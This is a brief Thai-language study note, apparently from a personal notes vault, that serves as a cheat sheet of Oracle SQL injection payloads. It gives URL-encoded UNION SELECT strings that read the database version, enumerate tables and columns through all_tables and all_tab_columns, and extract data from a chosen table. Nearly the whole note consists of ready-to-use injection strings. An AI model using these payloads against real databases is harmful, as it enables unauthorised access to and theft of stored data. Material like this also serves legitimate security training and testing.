# 🔷 3. Oracle-specific Payloads

> Oracle ใช้ syntax ที่แตกต่างจาก DB อื่น — ต้องมี `FROM v$version` / `FROM all_tables` เสมอ

## Comment Syntax
| DB | Comment |
|----|---------|
| PostgreSQL, Oracle | `--` |

## Database Version
```sql
'+UNION+SELECT+banner,NULL+FROM+v$version--
```

## ดู Tables ทั้งหมด
```sql
SELECT+table_name,NULL+FROM+all_tables
```

## ค้นหา Table (LIKE search)
```sql
+WHERE+table_name+LIKE+'ชื่อที่ต้องการค้นหา%'--
```

## ดู Columns ของ Table
```sql
+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='ชื่อที่ต้องการค้นหา'--
```

## ดึงข้อมูลออกมา
```sql
'+UNION+SELECT+ชื่อcolumn,ชื่อcolumn+FROM+ชื่อTable--
```

## 🔗 ดูเพิ่ม
- [[01-SQL-Basic|SQL พื้นฐาน]]
- [[02-Blind-SQL|Blind SQL - Oracle Section]]

#sql-injection #oracle
